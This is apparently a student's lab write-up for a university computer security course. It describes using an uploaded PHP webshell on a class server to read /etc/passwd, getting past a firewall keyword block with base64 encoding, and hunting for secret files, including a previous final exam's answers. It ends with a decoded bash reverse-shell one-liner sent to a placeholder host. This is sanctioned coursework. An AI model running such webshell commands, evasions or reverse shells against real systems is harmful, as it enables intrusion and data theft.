# Reverse Shell

Kezia Sharnoff

October 29, 2025

CS338 Computer Security

## Part One

### A
I first uploaded a php file (`sharnoffk-webshell`) with the exact contents as the example. I then went to the following URL: 
> danger.jeffondich.com/uploadedimages/sharnoffk-webshell1.php?command=whoami

I got the response:

> www-data


### B
The `<pre>` tag formats the output of the php code using HTML `<pre>` which keeps the format of the outputted text. For example, the output of `ls` with the `<pre>` tag is on different lines but without it is all on one line and is harder to read. This is because HTML when given new lines between text will automatically display them on one line, unless other formatting (like `<pre>`) is done. 

secret file!! 

cat ../youwontfindthiswithgobuster/secret.txt

## Part Two

### A
Danger is in `/var/www` which I found via the `pwd` command: 

```
http://danger.jeffondich.com/uploadedimages/sharnoffk-webshell1.php?command=whoami
/var/www/danger.jeffondich.com/uploadedimages
```


### B
At first, I was to find the list of users. I know that `/etc/passwd` does contain them (from this [documentation page](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/4/html/introduction_to_system_administration/s2-acctsgrps-files)), but I was unable to view that field. Whenever I did `cat /etc/passwd`, I got the error of 

```
This site can’t be reached
The connection was reset.
Try:


Checking the connection
Checking the proxy and the firewall
ERR_CONNECTION_RESET 
```

I did a Wireshark trace and whenever my browser (Chrome on my host computer **and** Firefox on Kali) sent the GET request of `GET /uploadedimages/sharnoffk-webshell1.php?command=cat%20/etc/passwd HTTP/1.1\r\n`, the TCP connection was stopped using the `RST` reset flag from the server. This led to my browser redoing the TCP handshake and requesting the file again, which would cause the server to `RST` again, and this process kept repeating. 

I talked to Jeff about this problem and he said that `passwd` as a term was blocked as an outgoing request from Carleton's firewall. However, he discovered that the base64 encoded version of `passwd` was not blocked. Therefore, I used a `base64` command term that the PHP decoded in order to get the file. 

I used `http://danger.jeffondich.com/uploadedimages/sharnoffk-webshell64.php?bcmd=Y2F0IC9ldGMvcGFzc3dkCg==` and got the following list of names from the /etc/passwd file:

> root, daemon, bin, sys, sync, games, man, lp, mail, news, uucp, proxy, www-data, backup, list, irc, gnats, nobody, systemd-network, systemd-resolve, messagebus, systemd-timesync, syslog, \_apt, tss, uuidd, tcpdump, usbmux, sshd, pollinate, landscape, fwupd-refresh, jeff, postgres, bullwinkle, dhcpcd, polkitd

### C
I do have access (using base64 encoding) as talked about in **B**.

From reading the [documentation](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/4/html/introduction_to_system_administration/s2-acctsgrps-files), the file contains information about each user in the format of:
> `username:password (or x):user ID:group ID:GECOS extra info field:shell`

For example, Jeff's user has the following information:
> `jeff:x:1000:1000:Jeff Ondich,,,:/home/jeff:/bin/bash`

The following is known about the user that I act as with the PHP web shell:
> `www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`


### D
I do not have access, a blank page is returned. According to some [Linux documentation](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/4/html/introduction_to_system_administration/s3-acctsgrps-shadow), `/etc/shadow` contains the passwords for each of the users. It is only available to root so that attackers cannot try to crack the encrypted passwords.

### E

I started searching by looking in the nearby directories with `ls -la` and I found `/var/www/danger.jeffondich.com/youwontfindthiswithgobuster/secret.txt` which has the following contents: 

```
Congratulations!
   ___     ___
  (o o)   (o o)
 (  V  ) (  V  ) 
/--m-m- /--m-m-

https://www.asciiart.eu/animals/birds-land
```

I noticed that this file had `secret` in the name, so I wanted to search for all files with `secret` in the name faster than manually. I used the command `find / -n '*secret*'`, which is encoded as `find%20/%20-name%20%27*secret*%27`. This searched all directories under / for any files with the name `secret` in them. From this, I have gotten a long list of secret files:
```
/home/jeff/supersecret.txt
/home/jeff/tmp/secret.php
/home/jeff/tmp/boeror_finding_supersecret7.php
/home/jeff/tmp/boeror_supersecret.php
/home/jeff/tmp/boeror_finding_supersecret3.php
/home/jeff/tmp/boeror_finding_supersecret9.php
/home/jeff/tmp/boeror_finding_supersecret.php
/home/jeff/tmp/boeror_finding_supersecret6.php
/home/jeff/tmp/boeror_finding_supersecret2.php
/home/jeff/tmp/boeror_finding_supersecret5.php
/home/jeff/tmp/boeror_finding_supersecret4.php
/home/jeff/tmp/boeror_finding_supersecret8.php
/home/jeff/tmp/borlaka_secret.php
/opt/more-secrets.txt
/opt/.even-more-secrets.txt
/proc/sys/net/ipv4/ipfrag_secret_interval
/proc/sys/net/ipv6/conf/all/stable_secret
/proc/sys/net/ipv6/conf/default/stable_secret
/proc/sys/net/ipv6/conf/eth0/stable_secret
/proc/sys/net/ipv6/conf/lo/stable_secret
/proc/sys/net/ipv6/ip6frag_secret_interval
/usr/src/linux-headers-6.8.0-86/drivers/virt/coco/efi_secret
/usr/src/linux-headers-6.8.0-86/include/linux/secretmem.h
/usr/src/linux-headers-5.15.0-160/include/linux/secretmem.h
/usr/share/doc/git/contrib/credential/libsecret
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/python3-secretstorage
/usr/share/man/man3/key_secretkey_is_set.3.gz
/usr/share/man/man3/key_setsecret.3.gz
/usr/share/man/man2/memfd_secret.2.gz
/usr/share/bash-completion/completions/secret-tool
/usr/lib/python3/dist-packages/jeepney/tests/secrets_introspect.xml
/usr/lib/python3/dist-packages/keyring/backends/__pycache__/libsecret.cpython-312.pyc
/usr/lib/python3/dist-packages/keyring/backends/libsecret.py
/usr/lib/python3/dist-packages/secretstorage
/usr/lib/python3/dist-packages/uaclient/__pycache__/secret_manager.cpython-312.pyc
/usr/lib/python3/dist-packages/uaclient/secret_manager.py
/usr/lib/python3/dist-packages/botocore/data/secretsmanager
/usr/lib/python3.12/__pycache__/secrets.cpython-312.pyc
/usr/lib/python3.12/secrets.py
/usr/lib/modules/6.8.0-86-generic/kernel/drivers/virt/coco/efi_secret
/usr/lib/modules/6.8.0-86-generic/kernel/drivers/virt/coco/efi_secret/efi_secret.ko.zst
/sys/module/secretmem
/var/www/intrigue.jeffondich.com/misc/plans-and-secrets.txt
/var/www/danger.jeffondich.com/secrets
/var/www/danger.jeffondich.com/secrets/config/secrets.config
/var/www/danger.jeffondich.com/secrets/kindasecret.txt
/var/www/danger.jeffondich.com/youwontfindthiswithgobuster/secret.txt
/var/lib/dpkg/info/python3-secretstorage.md5sums
/var/lib/dpkg/info/python3-secretstorage.prerm
/var/lib/dpkg/info/python3-secretstorage.postinst
/var/lib/dpkg/info/python3-secretstorage.list
/var/lib/fwupd/pki/secret.key
```

I've checked a few of these, and the things that are `.txt` files seem to be genuine secret files while some of the `.pyc` and other files without extension names are not.

For example, `/home/jeff/supersecret.txt` is :

```
Congratulations!

/   \          /   \
\_   \        /  __/
 _\   \      /  /__
 \___  \____/   __/
     \_       _/
       | @ @  \_
       |
     _/     /\
    /o)  (o/\ \_
    \_____/ /
      \____/

https://www.asciiart.eu/animals/moose
```

And `/opt/.even-more-secrets.txt` is 
```
Aw, a little period couldn't hide me? So sad.
```

### F
Something interesting I found by searching for a file with a name including `338` was the file `/etc/systemd/system/cs338.final2024.service` which seems to be related to setting up a server for the final for last year. The contents of the file are:

```
[Unit]
Description=Jeff's dog server CS338, Fall 2024
After=network.target

[Service]
User=www-data
Group=www-data
WorkingDirectory=/var/www/intrigue.jeffondich.com
ExecStart=/home/jeff/final2024/dogserver.py

[Install]
WantedBy=multi-user.target
```

I wondered if I could find any other class material so I searched for 2025 (didn't find anything) and then searched for 2024. I got the following contents:

``` 
/home/jeff/final2024
/home/jeff/student-attacks-2024.tar.gz
/etc/systemd/system/cs338.final2024.service
/usr/share/postgresql/16/fix-CVE-2024-4317.sql
/usr/lib/python3/dist-packages/pytz-2024.1.egg-info
/usr/lib/python3/dist-packages/botocore/data/supplychain/2024-01-01 
```

I used `stat /home/jeff/final2024` and realized it was a directory. I looked in that directory and found a Python file that had the correct and incorrect answers to the "dogserver" where the correct answer is: 
```
SUCCESS_MESSAGE = '''
Jeff's dog server says the secret is:

    The previous dog, Ruby, was a master of escape.
    At 105 pounds running full-tilt, she was impossible
    to tackle.

'''
```

## Part Four

### A
I used `ifconfig` and got 192.168.64.3

### B 
I used `ifconfig | grep inet` and got the following IPv4 non-broadcast addresses:

```
inet 127.0.0.1
inet 10.133.7.210
inet 192.168.64.1
```

I know that `127.0.0.1` is a loopback and is myself. I know that `192.168.64.1` is an address used for [wifi admin](https://router-network.com/ip/192-168-64-1). Therefore, the IP address I should use is `10.133.7.210`


### E 
I do have a shell and I can excute commands. I know that it is Kali because the prompt says 

```
www-data@kali-cs:
```

In addition, I'm sure its Kali because I did `ls` and saw the files that I put there. 

### F
Those are characters being encoded for URLs. I read [this source](https://www.w3schools.com/tags/ref_urlencode.ASP) on URL encoding which says that it has the pattern of `%AA` where the `AA` are replaced with two hexidecimal digits. This is important for differentiating symbols in queries (like the `/` used in my PHP commands above) versus structure in the URL (like a path/following/slashes) as well as including characters that cannot normally go in URLs (like spaces).


I consulted an [URL encoding reference](https://www.w3schools.com/tags/ref_urlencode.ASP) to figure what each of the encoded characters are: 

| Symbol | Meaning | 
| :---:  |    :----:   |
| `%20`  | space       | 
| `%22`  | " quotation mark | 
| `%3E`  | >       | 
| `%26`  | &       | 

Therefore, the URL un-encoded would be:

``` 
http://KALI_IP/YOUR_WEBSHELL.php?command=bash -c "bash -i >& /dev/tcp/YOUR_HOST_OS_IP/YOUR_CHOSEN_PORT 0>&1"
```

The bash command is: 
```
bash -i >& /dev/tcp/YOUR_HOST_OS_IP/YOUR_CHOSEN_PORT 0>&1
```









